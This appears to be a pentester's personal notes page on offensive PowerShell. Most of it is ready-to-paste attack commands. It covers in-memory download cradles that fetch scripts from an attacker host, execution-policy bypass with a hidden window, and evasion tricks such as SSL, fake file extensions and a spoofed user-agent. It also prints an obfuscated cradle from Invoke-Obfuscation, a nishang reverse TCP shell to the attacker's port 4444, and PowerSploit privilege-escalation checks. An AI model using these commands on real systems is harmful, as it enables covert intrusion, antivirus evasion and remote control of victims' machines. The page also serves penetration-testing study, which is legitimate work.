# 3 - Powershell for Pentesting Bypass/Evasion Methodologies

`cmd> powershell.exe -Command <cmd>` - launch PS from cmd prompt (windows).

`cmd> powershell.exe -Command Get-Process lsass | Select-Object name,id,path` - launch powershell from cmd prompt. or,

`cmd> powershell.exe -Command Get-Process lsass | Format-List name,id,path` - launch powershell from cmd prompt .

`Get-Process | Format-List *` - outputs all the properties, parameters and arguments for the Get-process cmd.

`ps | ? {$_.ProcessName -eq "lsass"}` - output the lsass process info.

or

`ps | Where-Object {$_.ProcessName -eq "lsass"}` .

`ps -IncludeUserName | Where-Object {$_.Username -match "SYSTEM"}` - outputs all processes running as SYSTEM.

### Importing Powershell Modules

Lets use the "PowerSploit" module as example. Download then entire zip from the github page. In powershell, type `$ENV:PSModulePath` - to get the module path, we will use the 1st path ie, the local user path. `C:\User\Documents\WindowsPowerShell\Modules` - create a "PowerSploit" folder, copy the extracted contents into it. Then type: `Import-Module PowerSploit` - to import the module. `Get-Module` - to view imported modules.

`Get-Command -Module PowerSploit` - view all the powersploit cmdlets.

{% hint style="info" %}
Incase the above cmd dosent return any result, that means the script uses Functions.

And we can view all Functions in a Powershell module/script file.

scripts like, PowerView, PowerUp, PowerSploit, etc... uses Functions.
{% endhint %}

`Get-Command -Type Function | Where-Object { $_.ScriptBlock.File -like "*\PowerView.ps1" }` - <mark style="color:orange;">outputs all functions related to the imported module.</mark>



There are help files for each of all the modules. `Get-Help Get-NetLocalGroups` - view the help file.

`Get-service | Where-Object {$_.Status -eq "Running"}` - display all running services.&#x20;

`Get-proces | Get-member -MemberType Method` - outputs all the methods for associated objects. eg kill, start etc..

`Get-Process -Name "firefox" | Kill` - kills the process.

### Bypass ExecutionPolicy and Hidden Windows feature

When executing the download cradles from a windows cmd prompt or shell, or when launching the PS executable, make sure to include the `-ExecutionPolicy Bypass` and `-Window Hidden` options.

This will ensure we can run scripts and our PS window stays hidden from the end user. `powershell.exe -ExecutionPolicy bypass -Window hidden .\script.ps1`

### Web Request

1. System.Net.WebClient
2. System.Net.WebRequest

### --> Using \[WebClient]

## A - Downloading Web Requests and executing scripts in memory

The "DownloadString" is what executes the script in the memory.

`ps> iex (New-Object Net.WebClient).DownloadString("http://192.168.0.100:8000/test.ps1")` - run PS scripts in memory.

`cmd> powershell.exe iex (New-Object Net.WebClient).DownloadString('http://192.168.0.100:8000/test.ps1')` - downloads and executes a remotely hosted powershell script from cmd prompt.&#x20;

or

`cmd> powershell.exe -Command $downloader = New-Object System.Net.WebClient; $payload = 'http://192.168.0.100:8000/test.ps1'; $command = $downloader.DownloadString($payload); Invoke-Expression $command` - executing it as a oneliner in cmd prompt terminal.

## Important Evasion Tips

### 1 - Use SSL when hosting files for transfer to victim

### 2  - Renaming .ps1 scripts with different extension name

It should be noted that where possible when hosting your remote Powershell Script, to have an SSL CERTIFICATE configured on the attacker machine. This helps in evading over-the-wire heuristics as our traffic will go over HTTPS. Another trick we can use which might help in evading basic file extension heutristics is to give our PS scripts a different extension, for instance, "Logo.gif". PS will still execute it as a .ps1 script.&#x20;

`cmd> powershell.exe iex (New-Object Net.Webclient).DownloadString('http://192.168.0.100:8000/test.gif')`

### 3 - Specifying Custom User-agent string to evade detection

The "Net.WebClient" class allows us to specify a custom user-agent string when sending the request to our attacker URL. This can help us evade detection mechanisms that are flagging on abnormal user-agent strings crossing the wire.

{% code overflow="wrap" lineNumbers="true" %}
```powershell
$downloader=New-Object System.Net.WebClient
$downloader.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36")
$payload="http://192.168.0.10/Get-ProcessPaths.ps1"
$command=$downloader.DownloadString($payload)
iex $command
```
{% endcode %}

{% code overflow="wrap" lineNumbers="true" %}
```powershell
# oneline run in cmd prompt terminal.
powershell.exe -Command $downloader=New-Object System.Net.WebClient; $downloader.Headers.Add('user-agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36'); $payload='http://192.168.0.100:8000/test.ps1'; $command=$downloader.DownloadString($payload); iex $command

# we can see below that the User-Agent field was modified successfully.
```
{% endcode %}

<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

## B - Downloading Web Requests and saving the file locally

We can also use this method instead of `certutil -urlcache -split -f <http...>` to transfer files to victim.

> Note: this method is noisy and not recommended to stay stealthy, but can sometimes be a handy and quick method to download/transfer files to a target/victim system.

{% code overflow="wrap" lineNumbers="true" %}
```powershell
# oneliner to be run in cmd prompt terminal.
# we use the "DownloadFile" method which takes 2 arguments (download url and local_path_to_save_file).
powershell.exe -Command (New-Object System.Net.WebClient).DownloadFile('http://192.168.0.100:8000/test.ps1', 'C:\Users\vagrant\TEMP\test.ps1')
```
{% endcode %}

We can execute the file immediately also using the `&` operator ie, "& local\_path\_to\_save\_file". But, then we have to store the `local_path_to_save_file` to a variable.

### --> Using \[WebRequest]

Aside from the "Net.WebClient" class, we can also use the "Net.WebRequest" class to download and execute scripts on a target in memory.

`powershell.exe -Command $req =[System.Net.WebRequest]::Create('http://192.168.0.100:8000/test.ps1'); $res = $req.GetResponse(); iex ([system.IO.StreamReader] ($res.GetResponseStream())).ReadToEnd()`

## <mark style="color:red;">Obfuscation</mark>

{% embed url="https://medium.com/@ammadb/invoke-obfuscation-hiding-payloads-to-avoid-detection-87de291d61d3" %}
Article on Invoke-Obfuscation
{% endembed %}

**Invoke-Obfuscation** is a tool developed to aid Blue Teams to simulate obfuscated payloads and to enhance their detection capabilities. This tool helps security teams to adapt the techniques used by adversaries and to find malicious indicators.

Download from the github page [https://github.com/danielbohannon/Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)

Once the Invoke-Obfuscation is downloaded, go the directory and list all the files. The tools comes with several files which are used in the module.

From this directory, we will use the following command to import the module manifest file.

> Import-Module .\Invoke-Obfuscation.psd1

Once the the command is executed successfully, launch the invoke-obfuscation using following command. _(Note: we might have to change the script execution policy if the psd1 is not executed. Use **set-execution policy** command)_

> Invoke-Obfuscation

We have different options we can use to obfuscate our PS cmds. But we will use "String and Encoding" methods here.

* First in order to tell Invoke-Obfuscation what we'd like to obfuscate, we first need to use the `SET SCRIPTBLOCK` cmd. ie;

&#x20;`Invoke-Obfuscation> SET SCRIPTBLOCK iex (New-Object Net.WebClient).DownloadString("http://192.168.0.100:8000/test.ps1")`

<figure><img src=".gitbook/assets/image (20).png" alt=""><figcaption><p>1</p></figcaption></figure>

* The "REVERSE" method will first concatenate our PS cmd line and then reverse the entire string.
* We select "option 3" (SELECT\1)

<figure><img src=".gitbook/assets/image (18).png" alt=""><figcaption><p>2</p></figcaption></figure>

We can copy and paste in victim and it will execute.

> <mark style="color:orange;">& ( $shELLId\[1]+$SHeLlID\[13]+'X')( (('i'+'ex (New-'+'O'+'bj'+'ec'+'t '+'Net.WebCli'+'en'+'t'+').d'+'ownlo'+'a'+'dstr'+'ing('+'oE'+'Ghttp://'+'192.1'+'6'+'8.0.1'+'00:8000/test'+'.'+'ps1oEG)') -REpLaCE'oEG',\[CHAr]34) )</mark>

* Now, lets take a look at "ENCODING" method which provides a bit more obfuscation and is a bit harder to detect. ie, ENCODING\7 (as Special Characters), then we can use the output as above.
* If you want to run in a cmd prompt terminal just enclose the generated result with <""> ie,

> <mark style="color:orange;">powershell.exe -Command "& ( $shELLId\[1]+$SHeLlID\[13]+'X')( (('i'+'ex (New-'+'O'+'bj'+'ec'+'t '+'Net.WebCli'+'en'+'t'+').d'+'ownlo'+'a'+'dstr'+'ing('+'oE'+'Ghttp://'+'192.1'+'6'+'8.0.1'+'00:8000/test'+'.'+'ps1oEG)') -REpLaCE'oEG',\[CHAr]34) )"</mark>

* Use the "RESET" method after every encoding to clear every previous encodings, this way they won't pile up on each other.
* We can also use the "TUTORIAL" cmd if stuck for guidiance.

## Exploitation with Powershell

### Host Scanning and Port Scanning

* PowerSploit (depricated). This is an efficient tool we can use for efficient discovery of hosts on a network "Invoke-Portscan" cmd from the Module.

### Post Exploitation with \[nishang]

* Nishang [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)

Page 223 in the pdf.

> Note: it is important to make sure that most of the tools and srpits we invoke should be invoked via download cradles that support in-memory execution. This is important because if we import them directly to the victim PC, Antivirus will detect them easily.

* We will be using the `Net.WebClient` and `DownloadString` method to execute our scripts in memory.

#### How to use nishang

* Navigate to the folder where you downloaded it to on kali.
* Setup a python server `python3 -m http.server` .
* Get the name of the .ps1 script you want to use for example: "Get-Information" the construct your download craddle and execute in the victim PC.&#x20;

`cmd> powershell.exe -Command iex (New-Object System.Net.WebClient).DownloadString('http://192.168.0.100:8000/Get-Information.ps1'); Get-Information`  - outputs important info about victim pc, you can explore with othe .ps1 scripts in nashang directory;

<figure><img src=".gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

* We can use the "Invoke-Obfuscation" PS script to obfuscate our PS cmd, tho i tried and Windows Defender still blocked it :(

#### Reverse PS TCP shells

We can use the "Invoke-PowerShellTcp" .ps1 script to establish a reverse shell to our kali machine.

`iex (New-Object System.Net.WebClient).DownloadString("http://192.168.0.100:8000/Invoke-PowerShellTcp.ps1"); Invoke-PowerShellTcp -Reverse -IPAddress 192.168.0.100 -Port 4444`&#x20;

### Post Exploitation with \[powersploit]

* Download the  file in kali and navigate to the folder [https://github.com/PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
* The PowerSploit module is used for indentification of misconfigurations which could lead to Privilege Escalation. Lets look within the Privesc category. We could Import the module or use the download craddle and launch some of the cmds on the victim.
  * `ps> Import-Module .\Privesc.psm1` - to import the module.
  * `ps> Get-Command -Module Privesc` - to view all the available cmds.
  * Read the README.md file in the Privesc folder.
  * `Invoke-AllChecks` - cmdlet to look for all privesc vectors.

#### Windows DLL hijacking

An article on DLL hijacking.

[http://blog.opensecurityresearch.com/2013/01/windows-dll-injection-basics.html](http://blog.opensecurityresearch.com/2013/01/windows-dll-injection-basics.html)

## Empire

Empire is a post-exploitation framework that includes a pure-PowerShell2.0 Windows agent, and a pure Python 2.6/2.7 Linux/OS X agent.

{% embed url="https://github.com/EmpireProject/Empire/wiki/Quickstart" %}





